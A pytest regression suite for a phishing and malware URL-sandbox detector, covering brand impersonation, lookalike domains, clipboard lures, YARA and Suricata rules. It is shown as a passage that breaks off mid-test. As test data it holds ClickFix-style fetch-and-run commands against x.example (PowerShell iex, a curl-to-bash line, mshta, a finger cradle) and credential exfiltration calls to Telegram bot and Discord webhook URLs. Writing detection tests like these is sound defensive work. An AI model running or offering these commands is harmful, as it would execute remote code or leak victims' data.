"""Detection-quality regressions: known false positives must stay quiet and the true
positives next to them must still fire. Each case is a minimal synthetic capture.
"""

import pytest

from sandbox.analysis.domains import (
    BrandRef,
    is_confusable_idn,
    lookalike,
    normalise_brand_domain,
    owned_by,
)
from sandbox.analysis.engine import behaviour_hits
from sandbox.analysis.facts import CaptureData, build_facts, obfuscation
from sandbox.analysis.local import builtin_behaviour
from sandbox.analysis.scoring import score
from sandbox.rules import defaults
from sandbox.rules.importer import parse_suricata_line, yara_metadata

BRANDS = [BrandRef(n, tuple(k), tuple(d)) for n, k, d in defaults.DEFAULT_BRANDS]
GOOGLE = next(b for b in BRANDS if b.name == "Google")


def _page(url, title="", text="", forms=(), loose_password=0):
    return {
        "frames": [
            {
                "url": url,
                "title": title,
                "text": text,
                "forms": list(forms),
                "iframes": [],
                "loose_password_fields": loose_password,
            }
        ]
    }


def _data(final_url, pages=(), **result) -> CaptureData:
    base = {
        "url": final_url,
        "final_url": final_url,
        "pages": list(pages),
        "redirects": [],
        "navigations": [{"url": final_url}],
        "hosts": {},
    }
    return CaptureData(result={**base, **result}, brands=BRANDS)


def _hits(data: CaptureData) -> set[str]:
    return {h["rule_name"] for h in behaviour_hits(builtin_behaviour(), build_facts(data))}


PASSWORD_FORM = {"action": "", "fields": [{"type": "email"}, {"type": "password"}]}


# --- brand ownership ------------------------------------------------------------------


@pytest.mark.parametrize(
    "host",
    [
        "doodles.google",  # doodles.google.com redirects here
        "blog.google",
        "www.google.de",
        "www.google.co.uk",
        "google.com.au",
        "www.youtube.com",
        "accounts.google.com",
    ],
)
def test_google_owns(host):
    assert GOOGLE.owns(host)


@pytest.mark.parametrize(
    "host", ["google.tk", "google-login.xyz", "googlee.com", "notgoogle.com", "google.evil.com"]
)
def test_google_does_not_own(host):
    assert not GOOGLE.owns(host)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("Google.com", "google.com"),
        ("*.google.com", "google.com"),
        ("google", "google"),
        ("google.*", "google.*"),
        ("bad domain", None),
        ("a.b.*", None),
        ("-x.com", None),
    ],
)
def test_normalise_brand_domain(raw, expected):
    assert normalise_brand_domain(raw) == expected


def test_owned_by_plain_entries_need_a_label_boundary():
    assert owned_by("login.paypal.com", ["paypal.com"])
    assert not owned_by("evilpaypal.com", ["paypal.com"])


# --- brand impersonation --------------------------------------------------------------


def test_google_doodles_is_not_impersonation():
    """Regression: doodles.google (a Google brand TLD) was scored as impersonating Google."""
    page = _page(
        "https://doodles.google/",
        title="Google Doodles",
        text="Google Doodles archive. Sign in with your Google account. Gmail",
    )
    data = _data("https://doodles.google/", [page])
    facts = build_facts(data)
    assert facts["brand"]["name"] is None
    assert "brand_impersonation" not in _hits(data)


def test_brand_mention_without_credentials_is_not_impersonation():
    page = _page(
        "https://news.example/tech",
        title="Google announces new Gmail features",
        text="Google said on Tuesday that Gmail will ...",
    )
    data = _data("https://news.example/tech", [page])
    assert build_facts(data)["brand"]["credential_prompt"] is False
    assert "brand_impersonation" not in _hits(data)


def test_newsletter_email_box_is_not_a_credential_prompt():
    page = _page(
        "https://news.example/tech",
        title="Google announces new Gmail features",
        text="Log in to comment. Subscribe to our newsletter for Google news.",
        forms=[{"action": "https://news.example/sub", "fields": [{"type": "email"}]}],
    )
    assert "brand_impersonation" not in _hits(_data("https://news.example/tech", [page]))


def test_brand_phishing_page_is_impersonation():
    page = _page(
        "https://secure-account.example/",
        title="Sign in - Google Accounts",
        text="Google. Sign in to continue to Gmail",
        forms=[PASSWORD_FORM],
    )
    data = _data("https://secure-account.example/", [page])
    facts = build_facts(data)
    assert facts["brand"]["name"] == "Google"
    assert facts["brand"]["credential_prompt"] is True
    assert "brand_impersonation" in _hits(data)


def test_two_step_login_email_page_is_impersonation():
    page = _page(
        "https://m365-portal.example/",
        title="Sign in to your Microsoft account",
        text="Microsoft Sign in. Email, phone, or Skype",
        forms=[{"action": "", "fields": [{"type": "email", "name": "loginfmt"}]}],
    )
    assert "brand_impersonation" in _hits(_data("https://m365-portal.example/", [page]))


def test_brand_text_from_earlier_genuine_page_is_not_pooled():
    """A genuine Google page early in the chain must not lend its text to the final page."""
    google = _page("https://www.google.com/", title="Google", text="Google Gmail Images")
    final = _page("https://shop.example/login", title="Shop", text="Log in", forms=[PASSWORD_FORM])
    data = _data("https://shop.example/login", [google, final])
    assert "brand_impersonation" not in _hits(data)


def test_keyword_matches_whole_words_only():
    page = _page(
        "https://shop.example/",
        title="Purchase orders",
        text="Purchase your order",
        forms=[PASSWORD_FORM],
    )
    assert build_facts(_data("https://shop.example/", [page]))["brand"]["name"] is None


# --- lookalikes and IDNs ----------------------------------------------------------------


@pytest.mark.parametrize(
    "host",
    [
        "outlook.corp-example.com",  # self-hosted webmail
        "offices.com",
        "static.com",  # one edit from gstatic
        "chrome-plating.example",
        "doodles.google",
        "www.google.de",
        "apple-orchard.example",
    ],
)
def test_lookalike_false_positives(host):
    assert lookalike(host, BRANDS, set()) is None


@pytest.mark.parametrize(
    "host", ["0ffice.com", "g00gle.com", "paypal-verify.example", "amazon-billing.example"]
)
def test_lookalike_still_detected(host):
    assert lookalike(host, BRANDS, set()) is not None


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("xn--pypal-4ve.com", True),  # pаypal with a Cyrillic а
        ("xn--80ak6aa92e.com", True),  # аррӏе, all Cyrillic lookalikes
        ("xn--e1afmkfd.xn--p1ai", False),  # пример.рф, ordinary Cyrillic
        ("example.com", False),
    ],
)
def test_confusable_idn(host, expected):
    assert is_confusable_idn(host) is expected


# --- forms ------------------------------------------------------------------------------


def test_same_brand_credential_post_is_not_cross_domain():
    page = _page(
        "https://login.live.com/",
        title="Sign in",
        forms=[{"action": "https://login.microsoftonline.com/ppsecure/post.srf", **PASSWORD_FORM}],
    )
    assert "form_posts_cross_domain" not in _hits(_data("https://login.live.com/", [page]))


def test_javascript_action_is_not_cross_domain():
    form = {"action": "javascript:void(0)", "fields": [{"type": "password"}]}
    page = _page("https://app.example/login", forms=[form])
    assert "form_posts_cross_domain" not in _hits(_data("https://app.example/login", [page]))


def test_mailto_action_is_cross_domain():
    form = {"action": "mailto:drop@evil.example", "fields": [{"type": "password"}]}
    page = _page("https://app.example/login", forms=[form])
    assert "form_posts_cross_domain" in _hits(_data("https://app.example/login", [page]))


def test_password_form_on_new_domain():
    page = _page("https://fresh.example/", forms=[PASSWORD_FORM])
    data = _data("https://fresh.example/", [page])
    data.domain_ages = {"fresh.example": 5}
    assert "credential_form_on_new_domain" in _hits(data)
    data.domain_ages = {"fresh.example": 500}
    assert "credential_form_on_new_domain" not in _hits(data)


def test_young_third_party_domain_is_not_newly_registered():
    data = _data("https://start.example/")
    data.domain_ages = {"start.example": 4000, "ads-cdn.example": 3}
    assert "newly_registered_domain" not in _hits(data)


# --- clipboard ---------------------------------------------------------------------------


def _clip(text):
    return [{"page": "p0", "api": "navigator.clipboard.writeText", "text": text}]


@pytest.mark.parametrize(
    "text",
    [
        'powershell -w hidden -c "iwr http://x.example/a.ps1 | iex"',
        "powershell -enc " + "A" * 60,
        "mshta https://x.example/verify.hta",
        "cmd /c powershell iex(irm x.example) # I am not a robot - reCAPTCHA ID 4821",
        '/bin/bash -c "$(curl -fsSL https://x.example/install.sh)"',
        # finger.exe cradle seen in the wild: %COMSPEC%, caret-escaped binary, padded decoy.
        '%COMSPEC% /c start "" /min for /f "delims=@" %m in '
        "(',f^^i^^n^^g^^e^^r RscncqFRZn@id-dns.net') do %m &                "
        "--------------P_u_s_h----t_h_e----_E_n_t_e_r_----k_e_y--      ",
        "finger user@x.example | cmd",
        "cmd /c for /f \"tokens=*\" %a in ('curl -s x.example/p') do %a",
        'p""owershell -w h -c "irm x.example|iex"',
    ],
)
def test_clickfix_commands(text):
    hits = _hits(_data("https://start.example/", clipboard=_clip(text)))
    assert "clickfix_clipboard_command" in hits
    assert "clipboard_command_write" not in hits


def test_docs_copy_button_is_not_clickfix():
    data = _data(
        "https://docs.example/",
        clipboard=_clip("curl https://api.example.com/v1/charges -u sk_test_123:"),
    )
    hits = _hits(data)
    assert "clickfix_clipboard_command" not in hits
    assert "clipboard_command_write" in hits


@pytest.mark.parametrize(
    "text",
    [
        'for /f "tokens=*" %i in (files.txt) do echo %i',
        "pip install --upgrade sandbox-client",
        "cmd /c dir C:\\Users",
    ],
)
def test_docs_cmd_snippets_are_not_clickfix(text):
    assert "clickfix_clipboard_command" not in _hits(
        _data("https://docs.example/", clipboard=_clip(text))
    )


def test_plain_command_with_run_dialog_lure_is_clickfix():
    page = _page(
        "https://verify.example/",
        title="Verify you are human",
        text="Press Win + R, then Ctrl + V and Enter to complete verification",
    )
    data = _data("https://verify.example/", [page], clipboard=_clip("cmd /c start calc"))
    assert "clickfix_clipboard_command" in _hits(data)


# --- downloads ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("name", "head", "disguised"),
    [
        ("invoice.pdf.exe", b"MZ", True),
        ("report.pdf", b"MZ\x90\x00", True),
        ("report.pdf", b"%PDF-1.7", False),
        ("setup.exe", b"MZ", False),
    ],
)
def test_disguised_download(name, head, disguised):
    data = _data("https://start.example/", downloads=[{"sha256": "aa", "suggested_filename": name}])
    data.download_heads = {"aa": head}
    assert ("disguised_download" in _hits(data)) is disguised


def test_unprompted_document_download_is_not_automatic_download():
    data = _data(
        "https://start.example/", downloads=[{"sha256": "aa", "suggested_filename": "menu.pdf"}]
    )
    data.download_heads = {"aa": b"%PDF-1.7"}
    assert "automatic_download" not in _hits(data)


def test_unprompted_archive_is_automatic_download():
    data = _data(
        "https://start.example/", downloads=[{"sha256": "aa", "suggested_filename": "doc.zip"}]
    )
    data.download_heads = {"aa": b"PK\x03\x04"}
    assert "automatic_download" in _hits(data)


# --- redirects ---------------------------------------------------------------------------


def test_same_site_canonicalisation_hops_are_not_suspicious():
    hops = [
        {"from": "http://shop.example/", "to": "https://shop.example/", "type": "http_301"},
        {"from": "https://shop.example/", "to": "https://www.shop.example/", "type": "http_301"},
        {"from": "https://www.shop.example/", "to": "https://www.shop.example/en", "type": "js"},
        {"from": "https://www.shop.example/en", "to": "https://www.shop.example/en/", "type": "js"},
    ]
    assert "suspicious_redirect_chain" not in _hits(
        _data("https://www.shop.example/en/", redirects=hops)
    )


def test_google_sso_hops_are_same_site():
    hops = [
        {"from": "https://www.youtube.com/", "to": "https://accounts.google.com/", "type": "js"},
        {"from": "https://accounts.google.com/", "to": "https://www.google.de/", "type": "js"},
        {"from": "https://www.google.de/", "to": "https://doodles.google/", "type": "js"},
    ]
    facts = build_facts(_data("https://doodles.google/", redirects=hops))
    assert facts["redirects"]["cross_domain"] == 0


# --- scripts -----------------------------------------------------------------------------


def test_obfuscator_io_detected_without_catastrophic_backtracking():
    names = " ".join(f"var _0x{i:04x}=1;" for i in range(25))
    assert "obfuscator_io" in obfuscation(names)[1]
    # 19 distinct names in a large file: below threshold, and must return promptly.
    near_miss = " ".join(f"_0x{i:04x}" for i in range(19)) + " x" * 200_000
    assert "obfuscator_io" not in obfuscation(near_miss)[1]


# --- YARA --------------------------------------------------------------------------------


def _yara(name):
    import yara

    return yara.compile(source=defaults.BUILTIN_YARA[name])


@pytest.mark.parametrize(
    ("rule", "content", "expected"),
    [
        # WordPress login: password field and "login.php" are not a phishing kit.
        (
            "phishkit_credential_exfil",
            b'<form action="wp-login.php"><input type="password" name="pwd"></form>',
            False,
        ),
        (
            "phishkit_credential_exfil",
            b'fetch("https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"'
            b'+"/sendMessage",{method:"POST"})',
            True,
        ),
        (
            "phishkit_credential_exfil",
            b'$.post("https://discord.com/api/webhooks/123456789012345678/abc", data)',
            True,
        ),
        # An SPA "export CSV" button.
        (
            "html_smuggling_blob_download",
            b"const b=new Blob([csv]);a.href=URL.createObjectURL(b);a.download='report.csv';"
            b"a.click()",
            False,
        ),
        (
            "html_smuggling_blob_download",
            b"var b=new Blob([d]);a.href=URL.createObjectURL(b);a.download='Invoice.iso';a.click()",
            True,
        ),
        (
            "html_smuggling_blob_download",
            b'var p="' + b"QUJD" * 600 + b'";var d=atob(p);var b=new Blob([d]);'
            b"a.href=URL.createObjectURL(b);a.download=name;a.click()",
            True,
        ),
        # A page that says "verify" and uses Ctrl+V somewhere, with "iex" inside a word.
        (
            "clickfix_powershell_lure",
            b"<p>Verify your email. Paste with Ctrl+V.</p><script>var pieX=1</script>",
            False,
        ),
        (
            "clickfix_powershell_lure",
            b"<h2>I'm not a robot</h2><p>Press Win+R, paste with Ctrl+V and press Enter</p>"
            b"<script>navigator.clipboard.writeText(cmd)</script>",
            True,
        ),
        ("hta_application", b'<HTA:APPLICATION ID="x" WINDOWSTATE="minimize">', True),
        ("windows_executable", b"MZ", False),  # truncated header must not read out of bounds
    ],
)
def test_builtin_yara(rule, content, expected):
    assert bool(_yara(rule).match(data=content)) is expected


def test_builtin_yara_metadata_parses_tags_on_their_own_line():
    meta = yara_metadata(defaults.BUILTIN_YARA["clickfix_powershell_lure"])
    assert meta["tags"] == ["clickfix"]
    assert meta["severity"] == "critical"
    assert meta["attack_ids"] == ["T1204.004"]


# --- Suricata ----------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("line", "severity"),
    [
        (
            'alert http any any -> any any (msg:"ET MALWARE Stealer"; classtype:trojan-activity; '
            "sid:1; metadata: signature_severity Major;)",
            "high",
        ),
        (
            'alert dns any any -> any any (msg:"ET INFO Observed DNS Query to .top"; '
            "classtype:bad-unknown; sid:2;)",
            "info",
        ),
        (
            'alert http any any -> any any (msg:"ET PHISHING Kit"; classtype:social-engineering; '
            "sid:3;)",
            "medium",
        ),
        (
            'alert tls any any -> any any (msg:"ET POLICY TLS"; classtype:policy-violation; '
            "sid:4; metadata: signature_severity Informational;)",
            "info",
        ),
    ],
)
def test_suricata_severity(line, severity):
    assert parse_suricata_line(line)["severity"] == severity


def test_informational_suricata_alerts_do_not_score():
    alerts = [
        {"sid": 1, "signature": "ET INFO Observed DNS Query to .cloud TLD", "severity": 2},
        {"sid": 2, "signature": "ET POLICY curl User-Agent Outbound", "severity": 2},
        {"sid": 3, "signature": "SURICATA STREAM 3way handshake wrong seq", "severity": 3},
    ]
    result = score(
        rule_hits=[],
        indicator_hits=[],
        suricata_alerts=alerts,
        weights={},
        thresholds={"suspicious": 30, "malicious": 70},
        allowlisted=set(),
        capture_ok=True,
    )
    assert result.score == 0
    assert result.verdict == "benign"


def test_suricata_alerts_scale_by_severity_and_are_capped():
    alerts = [{"sid": i, "signature": f"ET MALWARE x{i}", "severity": 1} for i in range(5)]
    result = score(
        rule_hits=[],
        indicator_hits=[],
        suricata_alerts=alerts,
        weights={},
        thresholds={"suspicious": 30, "malicious": 70},
        allowlisted=set(),
        capture_ok=True,
    )
    assert result.score == 45


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("login.kit.pages.dev", ["login.kit.pages.dev", "kit.pages.dev", "pages.dev"]),
        (
            "www.evil.example.co.uk",
            ["www.evil.example.co.uk", "evil.example.co.uk", "example.co.uk"],
        ),
        ("evil.com", ["evil.com"]),
        ("10.0.0.1", ["10.0.0.1"]),
    ],
)
def test_parent_domains_for_feed_matching(host, expected):
    from sandbox.analysis.domains import parent_domains

    assert parent_domains(host) == expected


# --- feed matching: scheme, submitted URL, host root (the new-18a.pages.dev case) -------


def test_feed_http_url_matches_https_visit():
    """The feed lists http://, Chrome upgraded .dev (HSTS preload) to https:// itself."""
    from sandbox.analysis.engine import match_candidates

    result = {
        "url": "http://new-18a.pages.dev/",
        "final_url": "https://new-18a.pages.dev/",
        "navigations": [{"url": "https://new-18a.pages.dev/"}],
        "redirects": [],
        "hosts": {"new-18a.pages.dev": ["104.21.0.1"]},
    }
    values = match_candidates(result, [], ["new-18a.pages.dev"])
    assert "http://new-18a.pages.dev/" in values["url"]
    assert "https://new-18a.pages.dev/" in values["url"]


def test_feed_root_url_matches_deeper_page_and_submitted_url_counts():
    from sandbox.analysis.engine import match_candidates

    result = {"url": "https://kit.web.app/login", "final_url": "https://kit.web.app/login"}
    values = match_candidates(result, [], ["kit.web.app"], submitted=["kit.web.app/login?x=1"])
    assert "http://kit.web.app/" in values["url"]  # the host root, both schemes
    assert "https://kit.web.app/login?x=1" in values["url"]  # the submitted URL itself


@pytest.mark.parametrize(
    ("host", "expected"),
    [
        ("kit.pages.dev", "kit.pages.dev"),
        ("a.b.kit.pages.dev", "kit.pages.dev"),
        ("pages.dev", "pages.dev"),
        ("sites.google.com", "sites.google.com"),
        ("www.example.co.uk", "example.co.uk"),
    ],
)
def test_site_unit(host, expected):
    from sandbox.analysis.domains import site

    assert site(host) == expected


def test_allowlisted_platform_does_not_vouch_for_its_tenants():
    # pages.dev and web.app are Tranco top sites; their tenants are not.
    assert lookalike("paypal-login.web.app", BRANDS, {"web.app"}) is not None


# --- free hosting, UGC and government lookalikes -------------------------------------


def test_trezor_seo_page_on_free_hosting():
    """The live typedream.app page: brand + login title, no form."""
    page = _page(
        "https://start-io-login-trezr-cdn.typedream.app/",
        title="Trezor @Login | The official wallet* Secure your crypto assets",
        text="Trezor Login: The Ultimate Guide to Secure Crypto Access",
    )
    data = _data("https://start-io-login-trezr-cdn.typedream.app/", [page])
    data.allowlisted = {"typedream.app"}
    assert "brand_on_free_hosting" in _hits(data)


def test_brand_article_off_free_hosting_is_not_flagged():
    page = _page("https://news.example/", title="Trezor login guide", text="Trezor wallet review")
    assert "brand_on_free_hosting" not in _hits(_data("https://news.example/", [page]))


def test_brand_login_on_brand_owned_ugc_host_is_impersonation():
    """Microsoft-themed phish on Azure blob storage: windows.net no longer shields it."""
    url = "https://office365login.blob.core.windows.net/index.html"
    page = _page(
        url, title="Sign in to your Microsoft account", text="Microsoft", forms=[PASSWORD_FORM]
    )
    assert "brand_impersonation" in _hits(_data(url, [page]))


@pytest.mark.parametrize(
    "host",
    ["absher-gov-sa.com", "moi.gov.sa.verify-id.com", "govsa-fines.net", "gov-uk.tax-refund.xyz"],
)
def test_government_lookalike_detected(host):
    from sandbox.analysis.domains import government_lookalike

    assert government_lookalike(host, BRANDS, set()) is not None


@pytest.mark.parametrize(
    "host",
    [
        "www.absher.sa",
        "www.moi.gov.sa",
        "www.gov.uk",
        "ec2.us-gov-west-1.amazonaws.com",
        "gov.teams.microsoft.us",
        "govdelivery.com",
        "www.usa.gov",
    ],
)
def test_government_lookalike_not_detected(host):
    from sandbox.analysis.domains import government_lookalike

    assert government_lookalike(host, BRANDS, set()) is None


@pytest.mark.parametrize(
    ("host", "brand"),
    [
        ("alrajhi-online.com", "Al Rajhi Bank"),
        ("absher-sa.com", "Absher"),
        ("splonline-track.com", "Saudi Post (SPL)"),
    ],
)
def test_saudi_lookalikes(host, brand):
    found = lookalike(host, BRANDS, set())
    assert found is not None and found["brand"] == brand


def test_saudi_brand_owned_domains():
    owners = {b.name: b for b in BRANDS}
    assert owners["Absher"].owns("www.absher.sa")
    assert owners["Absher"].owns("www.moi.gov.sa")  # any government site may mention Absher
    assert owners["Google"].owns("www.google.com.sa")
    assert not owners["Absher"].owns("absher.sa.example.com")


# --- Saudi smishing payloads: card, OTP, pretext -------------------------------------

CARD_FORM = {
    "action": "",
    "fields": [
        {"type": "text", "name": "cardNumber"},
        {"type": "text", "name": "expiry_date"},
        {"type": "text", "name": "cvv"},
    ],
}


def test_spl_redelivery_fee_card_harvest():
    url = "https://splonline-track.com/pay"
    page = _page(
        url,
        title="البريد السعودي | إعادة التوصيل",
        text="شحنتك معلقة بسبب عنوان غير مكتمل. يرجى دفع رسوم إعادة التوصيل 2.00 ريال",
        forms=[CARD_FORM],
    )
    facts = build_facts(_data(url, [page]))
    assert facts["lure"]["payment_pretext"] > 0
    assert facts["brand"]["name"] == "Saudi Post (SPL)" and facts["brand"]["prompt"] == "payment"
    hits = _hits(_data(url, [page]))
    assert {"payment_card_harvest", "brand_impersonation", "lookalike_domain"} <= hits


def test_absher_otp_harvest():
    url = "https://absher-sa.com/verify"
    page = _page(
        url,
        title="أبشر - التحقق",
        text="أدخل رمز التحقق المرسل إلى جوالك",
        forms=[{"action": "", "fields": [{"type": "text", "name": "otp"}]}],
    )
    assert {"otp_harvest", "lookalike_domain"} <= _hits(_data(url, [page]))


def test_real_absher_otp_page_is_quiet():
    url = "https://www.absher.sa/portal/verify"
    page = _page(
        url,
        title="أبشر - التحقق",
        text="أدخل رمز التحقق",
        forms=[{"action": "", "fields": [{"type": "text", "name": "otp"}]}],
    )
    assert not _hits(_data(url, [page])) & {
        "otp_harvest",
        "brand_impersonation",
        "lookalike_domain",
    }


def test_plain_checkout_is_only_a_low_signal():
    url = "https://shop.example/checkout"
    page = _page(url, title="Checkout", text="Order summary", forms=[CARD_FORM])
    hits = _hits(_data(url, [page]))
    assert "payment_card_form" in hits
    assert "payment_card_harvest" not in hits


def test_seed_phrase_harvest_and_real_wallet():
    form = {"action": "", "fields": [{"tag": "textarea", "type": "textarea", "name": "phrase"}]}
    text = "Import your wallet. Enter your 12-word secret recovery phrase"
    fake = _page(
        "https://wallet-sync.example/import", title="Restore wallet", text=text, forms=[form]
    )
    assert "seed_phrase_harvest" in _hits(_data("https://wallet-sync.example/import", [fake]))
    real = _page("https://metamask.io/import", title="MetaMask", text=text, forms=[form])
    assert "seed_phrase_harvest" not in _hits(_data("https://metamask.io/import", [real]))


def test_arabic_keywords_match_whole_words_only():
    from sandbox.analysis.facts import _keyword

    assert _keyword("نسك").search("منصة نسك للحج")
    assert not _keyword("نسك").search("أداء المناسك")


def test_bip39_wordlist_yara():
    words = b'["abandon","ability","able","about","above", "...", "zero","zone","zoo"]'
    assert _yara("bip39_wordlist_embedded").match(data=words)
    assert not _yara("bip39_wordlist_embedded").match(data=b"abandon ship, above all")


# --- helpers for HAR / raw-DOM / result-backed captures -------------------------------


def _req(url, method="GET", post="", status=200, req_headers=None, set_cookie=None, body=""):
    return {
        "request": {
            "method": method,
            "url": url,
            "headers": [{"name": k, "value": v} for k, v in (req_headers or {}).items()],
            "postData": {"text": post} if post else {},
        },
        "response": {
            "status": status,
            "headers": [{"name": "set-cookie", "value": c} for c in (set_cookie or [])],
            "content": {"text": body},
        },
    }


def _cap(final_url, pages=(), har=(), dom_html=(), allowlisted=(), **result):
    data = _data(final_url, pages, **result)
    data.har_entries = list(har)
    data.dom_html = list(dom_html)
    data.allowlisted = set(allowlisted)
    return data


_TG_TOKEN = "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"


def test_telegram_bot_exfil_fires_and_widget_is_quiet():
    har = [_req(f"https://api.telegram.org/bot{_TG_TOKEN}/sendMessage", "POST", post="chat_id=1")]
    assert "telegram_bot_exfil" in _hits(_cap("https://kit.example/", har=har))
    # Telegram login/share widget: telegram.org (not api.telegram.org), no Bot API path.
    widget = [_req("https://telegram.org/js/telegram-widget.js")]
    assert "telegram_bot_exfil" not in _hits(_cap("https://blog.example/", har=widget))


def test_discord_webhook_exfil_fires_and_normal_discord_is_quiet():
    hook = "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwx"
    har = [_req(hook, "POST")]
    assert "discord_webhook_exfil" in _hits(_cap("https://kit.example/", har=har))
    normal = [_req("https://discord.com/app")]
    assert "discord_webhook_exfil" not in _hits(_cap("https://blog.example/", har=normal))


_MS_CLONE_HTML = (
    '<html><head><title>Sign in to your account</title></head><body>'
    '<form><input id="i0116" name="loginfmt"><input type="password" id="i0118">'
    '<input id="idSIButton9" type="submit"></form>'
    '<script>$Config={"urlGetCredentialType":"/common/GetCredentialType"};</script>'
    "</body></html>"
)


def test_ms_signin_clone_on_foreign_host_fires():
    dom = [{"url": "https://portal-login.example/", "html": _MS_CLONE_HTML}]
    assert "ms_signin_clone_foreign_host" in _hits(_cap("https://portal-login.example/", dom_html=dom))  # noqa: E501


def test_ms_signin_button_on_third_party_is_quiet():
    """A real site with a 'Sign in with Microsoft' button: one marker only, no clone."""
    html = (
        '<html><body><a href="https://login.microsoftonline.com/">Sign in with Microsoft</a>'
        '<form><input type="password"></form></body></html>'
    )
    dom = [{"url": "https://app.example/login", "html": html}]
    assert "ms_signin_clone_foreign_host" not in _hits(_cap("https://app.example/login", dom_html=dom))  # noqa: E501


def test_aitm_ms_paths_on_foreign_host_fires_and_real_ms_is_quiet():
    body = '$Config={"urlGetCredentialType":"x"}; i0116 idSIButton9'
    evil = [_req("https://evilproxy.example/common/oauth2/v2.0/authorize", body=body)]
    assert "aitm_ms_paths_foreign_host" in _hits(_cap("https://evilproxy.example/", har=evil))
    real = [_req("https://login.microsoftonline.com/common/oauth2/v2.0/authorize", body=body)]
    assert "aitm_ms_paths_foreign_host" not in _hits(_cap("https://login.microsoftonline.com/", har=real))  # noqa: E501


def test_idp_cdn_assets_on_foreign_page_fires_and_real_idp_is_quiet():
    cdn = [_req("https://aadcdn.msftauth.net/shared/1.0/logo.png")]
    page = _page("https://clone.example/", title="Sign in", text="Microsoft sign in",
                 forms=[PASSWORD_FORM])  # noqa: E501
    assert "idp_cdn_assets_foreign_page" in _hits(_cap("https://clone.example/", [page], har=cdn))
    ms_page = _page("https://login.live.com/", title="Sign in", text="Microsoft",
                    forms=[PASSWORD_FORM])  # noqa: E501
    assert "idp_cdn_assets_foreign_page" not in _hits(_cap("https://login.live.com/", [ms_page], har=cdn))  # noqa: E501


def test_ms_session_cookie_on_foreign_host_fires_and_real_ms_is_quiet():
    evil = [_req("https://evilproxy.example/", set_cookie=["ESTSAUTH=abc; Path=/"])]
    assert "ms_session_cookie_foreign_host" in _hits(_cap("https://evilproxy.example/", har=evil))
    real = [_req("https://login.microsoftonline.com/", set_cookie=["ESTSAUTH=abc"])]
    assert "ms_session_cookie_foreign_host" not in _hits(_cap("https://login.microsoftonline.com/", har=real))  # noqa: E501


def test_oauth_error_redirect_abuse_fires_and_silent_sso_is_quiet():
    bounce = [
        {"from": "https://lure.example/", "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none&client_id=x", "type": "js"},  # noqa: E501
        {"from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize", "to": "https://attacker.example/download/x?error=interaction_required", "type": "js"},  # noqa: E501
    ]
    assert "oauth_error_redirect_abuse" in _hits(_cap("https://attacker.example/download/x", redirects=bounce))  # noqa: E501
    # Silent SSO: the error bounces back to the IdP's own SPA, not a foreign host.
    sso = [
        {"from": "https://app.example/", "to": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?prompt=none", "type": "js"},  # noqa: E501
        {"from": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize", "to": "https://login.microsoftonline.com/error?error=login_required", "type": "js"},  # noqa: E501
    ]
    assert "oauth_error_redirect_abuse" not in _hits(_cap("https://app.example/", redirects=sso))


def test_illicit_consent_grant_fires_and_first_party_is_quiet():
    bad = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=11111111-2222-3333-4444-555555555555&scope=offline_access%20Mail.ReadWrite&prompt=consent"  # noqa: E501
    assert "illicit_consent_grant" in _hits(_cap("https://x.example/", navigations=[{"url": bad}]))
    fp = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=offline_access%20Mail.ReadWrite&prompt=consent"  # noqa: E501
    assert "illicit_consent_grant" not in _hits(_cap("https://x.example/", navigations=[{"url": fp}]))  # noqa: E501


def _rpc(host="bsc-dataseed.binance.org", to="0x1111111111111111111111111111111111111111"):
    body = (
        '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":'
        '[{"to":"' + to + '","data":"0x6d4ce63c"},"latest"]}'
    )
    return [_req(f"https://{host}/", "POST", post=body)]


def test_web3_rpc_from_non_wallet_page_fires_and_wallet_app_is_quiet():
    assert "web3_rpc_from_non_wallet_page" in _hits(_cap("https://compromised.example/", har=_rpc()))  # noqa: E501
    # A real dApp: the page used the wallet, so it is not EtherHiding.
    dapp = _cap("https://dapp.example/", har=_rpc(), wallet_requests=[{"method": "eth_requestAccounts"}])  # noqa: E501
    assert "web3_rpc_from_non_wallet_page" not in _hits(dapp)


def test_web3_known_malicious_contract_fires():
    har = _rpc(to="0x8eac3198dd72f3e07108c4c7cff43108ad48a71c")
    assert "web3_known_malicious_contract" in _hits(_cap("https://x.example/", har=har))
    assert "web3_known_malicious_contract" not in _hits(_cap("https://x.example/", har=_rpc()))


def _clipcap(url, clip_text, pages=()):
    clip = [{"page": "p0", "api": "navigator.clipboard.writeText", "text": clip_text}]
    return _cap(url, pages, clipboard=clip)


def test_fake_captcha_clipboard_command_fires_and_real_captcha_is_quiet():
    page = _page("https://verify.example/", title="Verify you are human",
                 text="Verification ID 4821. I am not a robot.")  # noqa: E501
    assert "fake_captcha_clipboard_command" in _hits(_clipcap("https://verify.example/", "cmd /c start calc", [page]))  # noqa: E501
    # Real reCAPTCHA page with no clipboard command.
    real = _page("https://signup.example/", title="Sign up", text="reCAPTCHA verification")
    assert "fake_captcha_clipboard_command" not in _hits(_cap("https://signup.example/", [real]))


def test_filefix_command_disguised_as_path_fires_and_plain_command_is_quiet():
    filefix = "powershell -NoP -W Hidden -c \"iwr x.example|iex\"            # C:\\\\Users\\\\Public\\\\HRPolicy.docx"  # noqa: E501
    assert "filefix_command_disguised_as_path" in _hits(_clipcap("https://share.example/", filefix))  # noqa: E501
    assert "filefix_command_disguised_as_path" not in _hits(_clipcap("https://docs.example/", "cmd /c dir C:\\Users"))  # noqa: E501


def test_fake_browser_update_fires_and_browser_update_org_is_quiet():
    page = _page("https://news-blog.example/", title="News",
                 text="Your browser is out of date. Update Chrome to continue.")  # noqa: E501
    data = _cap("https://news-blog.example/", [page],
